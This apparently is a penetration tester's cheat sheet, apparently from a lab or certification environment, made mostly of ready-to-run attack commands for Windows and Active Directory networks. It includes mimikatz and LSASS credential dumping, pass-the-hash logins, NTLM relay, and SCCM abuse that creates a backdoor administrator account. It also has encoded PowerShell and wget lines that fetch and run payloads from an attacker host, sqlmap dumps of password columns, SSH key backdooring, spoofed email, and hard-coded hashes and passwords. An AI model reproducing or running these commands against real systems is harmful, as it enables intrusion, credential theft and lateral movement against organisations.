  "targetRules": "",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": true,
  "log": "requests.log",
  "plugins": "all",
  "cert": "<public key from CA>",
  "certKey": "<private key generated when making CSR>",
  "certPool": ""
}
```
muraena usage - refer config.toml separately
```
mkdir /opt/muraena
cd /opt/muraena
wget https://github.com/muraenateam/muraena/releases/download/v1.12/muraena_linux_amd64
./muraena_linux_amd64 -config config.toml
```
```
# redis requirement (redis on kali)
sudo apt-get update
sudo apt-get -y install redis
redis-server --daemonize yes
ps aux | grep redis
```
met socks
```
background
use multi/manage/autoroute
set session 3
run
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
run -j
```
```
vi met.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```
mimi dump
```
iwr -uri http://192.168.10.11/mimidrv.sys -outfile c:\windows\tasks\mimidrv.sys
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
```
```
c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::sam" "exit"
c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::secrets" "exit"
c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
```
mimi pth
```
c:\windows\tasks\m.exe "privilege::debug" 
```
```
sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
```
```
sekurlsa::pth /user:administrator /domain:web06 /ntlm:f99529e42ee77dc4704c568ba9320a34 /run:"mstsc.exe /restrictedadmin"
```
msfvenom load shellcode from stdin
```
cat shellcode.bin | msfvenom -p - -f exe -a x64 --platform win -o mal.exe
```
mssqlclient
```
proxychains -q -f met.conf impacket-mssqlclient willy:'fdsfssdfDFG4'@sql05.corpy.com -windows-auth
```
mssql.exe shortcut
```
iwr -uri http://192.168.10.11/MSSQL.exe -outfile c:\windows\tasks\Parishcopsomewhat.exe
cmd /c c:\windows\tasks\Parishcopsomewhat.exe
```
netexec usage (nxc) - nxc smb
```
proxychains -q -f nextcloud.conf nxc smb 192.168.20.10 -u users.txt -p pass.txt --continue-on-success | tee nxc_smb_192.168.20.10.txt
```
nmap hybrid + automate
```
for i in $(cat ips.txt);do proxychains -q -f web05.conf nmap -Pn -v -p 22,3306,8080,8081,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_$i.txt $i;done
```
nmap linux
```
nmap -Pn -v -p 22,443,80,8080,8081,8082,8888,3306,53,25,143,110,993,587 -sCV -oN scans/nmap-tcpscans_192.168.80.164.txt 192.168.80.164
```
nmap windows
```
nmap -Pn -v -p 5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_192.168.80.169.txt 192.168.80.169
```
ntlmrelay (sql)
```
sudo service smbd stop;sudo service nmbd stop
sudo service smbd start;sudo service nmbd start
```
```
proxychains -q -f met.conf impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_SERVER
```
```
# current sql
xp_dirtree '\\192.168.10.11\a';
```
powershell cred
```
$username = 'username'
$password = 'password' | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
```
powershell encode b64
```
# encode
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))

# decode
[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($base64string))
```
powershell enter-pssession (winrm)
```
Enter-PSSession -Computer 192.168.20.15 -Credential domain\hola -Authentication Negotiate -Verbose  
```
powersccm usage (abuse sccm) [sauce](https://github.com/PowerShellMafia/PowerSCCM)
```
iex(new-object net.webclient).downloadstring('http://10.10.14.44/sccm.txt')
Find-LocalSccmInfo
# output looks like:
SiteCode ManagementServer
-------- ----------------
HO1      sccm.HoLa.local
```
```
# add new sccm session
New-SccmSession -ComputerName SCCM -SiteCode HO1 -ConnectionType WMI
Get-SCCMSession | Get-SCCMComputer
Get-SCCMSession | Get-SCCMCollection
```
```
# add new sccm application and collection
Get-SCCMSession | New-Sccmapplication -ApplicationName "appie" -PowershellScript "powershell -e B64CMD"
```
```
# deploy to all servers (not that recommended)
Get-SCCMSession | New-SccmapplicationDeployment -ApplicationName "appie" -Assignment "update" -CollectionName "All Systems"
Get-SCCMSession | Invoke-SCCMDeviceCheckin -CollectionName "All Systems"
```
```
# deploy to specific target server
Get-SCCMSession | New-SCCMCollection -CollectionName "collie" -CollectionType "Device"
Get-SCCMSession | Add-SCCMDeviceToCollection -ComputerNameToAdd "TARGETSERVER" -CollectionName "collie"
Get-SCCMSession | New-SccmapplicationDeployment -ApplicationName "appie" -Assignment "update" -CollectionName "collie"
Get-SCCMSession | Invoke-SCCMDeviceCheckin -CollectionName "collie"
```
```
# if the above don't work, NATIVE SCCM TOOLS
cd C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin
gci -filter ConfigurationManager.psd1
import-module .\ConfigurationManager.psd1
cd HO1: <<-- IMPORTANT: THE COLON IS IMPORTANT, site is based on Find-LocalSccmInfo
Get-CMSite
Get-CMManagementPoint
Get-CMActiveDirectoryForest
New-CMScript -ScriptName scrippie -Fast -ScriptText "net user jack P@ssw0rd /add;net localgroup Administrators jack /add"; Get-CMScript -Fast -ScriptName scrippie | Approve-CMScript;Get-CMScript -Fast -ScriptName scrippie | Invoke-CMScript -CollectionName 'All Desktop and Server Clients'
# now login as jack P@ssw0rd on the sccm clients from Get-SCCMSession | Get-SCCMComputer
```
```
# backup commands - creating new sccm site
Set-Location 'C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin'
Import-Module .\ConfigurationManager.psd1
New-PSDrive -Name "HO2" -PSProvider "CMSite" -Root "sccm.DOMAIN.local" -Description "HO2"
```
powerview acl perms of specific domain group
```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object Identity -match "DOMAIN\\GROUP"}
```
powerview get user memberof
```
get-netuser | select name,samaccountname,objectsid,memberof
```
powerview genericwrite
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "GenericWrite")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
```
powerview genericall
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "GenericAll")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
```
powerview writedacl
```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "WriteDACL")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
```
powerview forcechangepassword
```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "ForceChangePassword")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
```
printspoofer
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
```
```
iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Compromisewisdomwide.exe
iwr -uri http://192.168.10.11/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Compromisewisdomwide.exe
```
```
^Z
background
run -j
sessions -i 1
shell
```
```
c:\windows\tasks\ss.exe db02 db02/pipe/test
```
```
^Z
channel -i 1
```
privexchange [sauce](https://github.com/dirkjanm/PrivExchange) (+ ntlmrelayx)
```
proxychains -q -f server.conf impacket-ntlmrelayx -t ldap://dc.DOMAIN.local --escalate-user EXCHANGEUSER
```
```
cd /opt/PrivExchange
proxychains -q -f server.conf python3 ./privexchange.py -ah 10.10.14.34 -d DOMAIN.local -u guest -p "" exchange.cubano.local
```
printerbug [sauce](https://github.com/dirkjanm/krbrelayx) (+ ntlmrelayx)
```
proxychains -q -f server.conf impacket-ntlmrelayx -t dev.DOMAIN.local
```
```
cd /opt/krbrelayx
proxychains -q -f server.conf python3 ./printerbug.py DOMAIN/guest@exchange.DOMAIN.local 10.10.14.34
```
psexec.exe
```
iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
```
```
c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.corpy.com cmd
```
```
c:\windows\tasks\psexec.exe -accepteula -i -u "NT Authority\SYSTEM" cmd
```
rdp restrictedadmin / rdp pth
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```
```
proxychains -q -f web05.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.corpy.com /cert-ignore
```
```
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
```
```
c:\windows\tasks\m.exe "privilege::debug" 
```
```
sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
```
```
sekurlsa::pth /user:administrator /domain:file06 /ntlm:8821c97bc6b3d2aed6e30a9540f208f3 /run:"mstsc.exe /restrictedadmin"
```
rubeus asktgt ptt
```
.\r.exe hash /password:PASSWORD
.\r.exe asktgt /domain:DOMAIN.local /user:USERNAME /rc4:NTLM /ptt
```
rubeus triage
```
.\r.exe triage
```
runspace shortcut (powershell)
```
iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Tbsegabilly.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe

```
runspace shortcut (cmd)
```
bitsadmin /Transfer myJob http://192.168.10.11/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
```
ssl cert generation, with a CA
```
# start with CSR
openssl genrsa -out DOMAIN.com.key 4096
openssl req -new -key DOMAIN.com.key -out DOMAIN.com.csr -utf8 -batch -subj '/CN=DOMAIN.com/emailAddress=info@DOMAIN.com'
# output: DOMAIN.com.csr
openssl req -x509 -new -nodes -key DOMAIN.com.key -sha256 -days 1024 -out DOMAIN.com.pem
# output: DOMAIN.com.pem
```
```
# submit DOMAIN.com.csr to the CA
commonname: DOMAIN.com
email: info@DOMAIN.com
```
```
# once OK, download public key from CA as PEM
```
sharpmapexec usage - sme winrm
```
upload sme.exe
.\sme.exe ntlm winrm /user:DOMAIN\administrator /password:P@ssw0rd /computername:server.DOMAIN.local
```
smbmap usage
```
proxychains -q -f nextcloud.conf smbmap -u 'hola' -p 'P@ssw0rd' -H 192.168.20.10
```
sql enum
```
exec sp_linkedservers;
select name from sys.servers;
select * from sys.linked_logins;
```
```
select * from sys.server_principals where principal_id like 267;
```
```
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLServerLinkCrawl -Instance “sql03.final.com,1433” -query “select * from master..syslogins” | ft
```
sql exec
```
EXECUTE AS LOGIN = 'sa';
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
EXEC ('xp_cmdshell ''powershell -enc JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4ANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAKQA=''') AT SQL03;
```
sqlmap all (takes very long)
```
sqlmap -r burp.req --timeout=60 --proxy="http://127.0.0.1:8080" -a
sqlmap -r burp.req --timeout=60 --proxy="http://127.0.0.1:8080" --level=5 --risk=2 -p "search" -a --fresh-queries
```
sqlmap param boolean
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B"
```
sqlmap param databases
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL
```
sqlmap param tables
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL -D "dataleaks" --tables
```
sqlmap param columns
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL -D "dataleaks" --tables --columns
```
sqlmap dump specific database
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 --dbms=MySQL -D "dataleaks" --tables --dump
```
sqlmap dump specific table
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 --dbms=MySQL -D "dataleaks" -T "GoGames" --dump --fresh-queries
```
sqlmap dump specific columns
```
sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL -D "dataleaks" --tables --dump -C "username","email","password","hash"
```
ssh authorized_keys
```
echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FESnNwNHNlTktrZXRwaE40Y0pEdTg2aEJycDBWeXZibjhxSHhRWnprc3F2SWlJU1lYZDRxaW90b1padHRMTGlTSS9GWVFxT2xUUDBIeDFaUWNyZ0J3RmZObnB1dGJpK0lEb0RKeXo5QkxtSDE3WGhvYnF6Wk95bkREY1gzb2ZDeDY2a1YwZk5nSzhKTy91ZGhLNjZvc3pXaDdWUHgrOWJFajl6V1JjM3dvRUt4aDc2NVF2QTN6aVJQZ2NLRzFPWHBReVRRZE5oNVI0MVpCRkR2RDM3MFhSL3dMd0pYWnY4K3BEbjZidzFIQ3JNb00yNENJdFVlUmpvSVJhN25mTkluM2dzampRZ2NudC8wYlBYWE44c0lhamdNL1Fsb3ViaWlTclBna2xPNmJNS2RrRHpYTGlJdTNUYmNwNTVQbHVlNm15K0hOdWthYjdOa1U0akw5SjhobXZzZnBlcW9BMzJZdlUrTUhVQ0FmRFNkbHdtRFJscVFmS0kvcXh0cCtLMFFzSjNEK1ZDUHpNcGtlV2xHd1I3OW55WDNiQUZESVhtd1YyaEtldDJ5dWIxanMxMFYwTU5nSi9nMk1OTms5WVJrQ3NRcXptQ3VNajN6TG9Qa1krTmFMZjd4cUdJSTZSYW1zUnNTL01kNzF3T3ZGNjlpN2JhVklycTN4VTQxeVQ1bWM9IGthbGlAa2FsaQo=" | base64 -d >> authorized_keys
```
```
ssh -i ~/.ssh/id_rsa 'pat@corpy.com'@192.168.106.164
```
sshuttle usage
```
sshuttle -r root@nextcloud 192.168.20.0/24 192.168.21.0/24 192.168.22.0/24 192.168.23.0/24 192.168.24.0/24 -e 'ssh -i /home/kali/.ssh/id_rsa' -v
```
swaks usage (no attachment)
```
swaks --to TARGET_EMAIL --from SPOOFED_EMAIL --server IP_OR_URL --port 25 --body @body.txt --header "Subject: urgent"
```
swaks attachment
```
swaks --to TARGET_EMAIL --from SPOOFED_EMAIL --server IP_OR_URL --port 25 --body @body.txt --header "Subject: urgent" --attach inject.doc
```
sshuttle usage (with id_rsa login)
```
sshuttle -r root@nextcloud 192.168.20.0/24 192.168.21.0/24 192.168.22.0/24 192.168.23.0/24 192.168.24.0/24 -e 'ssh -i /home/kali/.ssh/id_rsa' -v
```
tar compress everything in a directory [sauce](https://stackoverflow.com/questions/3651791/tar-add-all-files-and-directories-in-current-directory-including-svn-and-so-on)
```
cd ..
tar -czf workspace.tar.gz workspace
```
tcpdump specific port
```
sudo tcpdump -n -i tun0 port 443
```
tcpdump ping
```
sudo tcpdump -i tun0 ip proto \\icmp
```
unconstrained delegation (notes: always use meterpreter to run rubeus and capture tix!!)
```
Get-DomainComputer -Unconstrained
```
```
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
iwr -uri http://192.168.10.11/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
```
```
# this part on meterpreter!!
c:\windows\tasks\or.exe monitor /interval:5 /filteruser:CDC01$
```
```
# this part ideally with RDP!! (or rs.txt)
c:\windows\tasks\ss.exe CDC01 APPSRV01
```
```
c:\windows\tasks\or.exe ptt /ticket:THETIX
```
```
c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt" "exit"
c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator" "exit"
```
unconstrained delegation ADDON: USING /ALTSERVICE
```
# MUST be rubeus minimum version 1.6.1 (alr in html)
.\r.exe s4u /impersonateuser:administrator /ticket:B64TICKET /altservice:cifs/server.DOMAIN.local /self /ptt
```
wdac bypass (lolbas + pypykatz -> dump lsass) [sauce](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
```
# first find lsass pid
get-process lsass
```
```
# dump lsass with lolbas to bypass wdac
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 600 C:\programdata\lsass.dmp full
```
```
# download lsass.dmp, read with pypykatz
pypykatz lsa minidump lsass.dmp
```
windows privesc - samdump
```
icacls C:\Windows\System32\config\Security
extrac32 /c /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\Security .\Security.txt
```
winrm usage
```
proxychains -q -f nextcloud.conf evil-winrm -i 192.168.20.15 -u 'hola' -p 'P@ssw0rd'
```
winrm pth
```
proxychains -q -f met.conf evil-winrm -i dc.domain.local -u 'domain\admin' -H '22be2f4edecb047c1529ad275fd82fe3'
```
wrap
```
wget http://192.168.49.80/wrap.txt -O /tmp/Fluzaspecialties.txt;chmod 777 /tmp/Fluzaspecialties.txt;/tmp/Fluzaspecialties.txt
```
xfreerdp pth
```
proxychains -q -f ssh.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.corpy.com /cert-ignore
```
xfreerdp pwd
```
proxychains -q -f web05.conf xfreerdp /u:administrator /d:dmzdc01.corpy.com /p:fgds90345SDfsw32 /v:dmzdc01.corpy.com /cert-ignore
```
cmd.exe as "NT Authority\SYSTEM" without psexec
```
# powershell - first enable interactive services
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Windows" -Name "NoInteractiveServices" -Value 0
```
```
# cmd - start interactive services
sc start ui0detect
```
```
sc create cmdsvc binpath= “cmd /K start” type= own type= interact
sc start cmdsvc
```
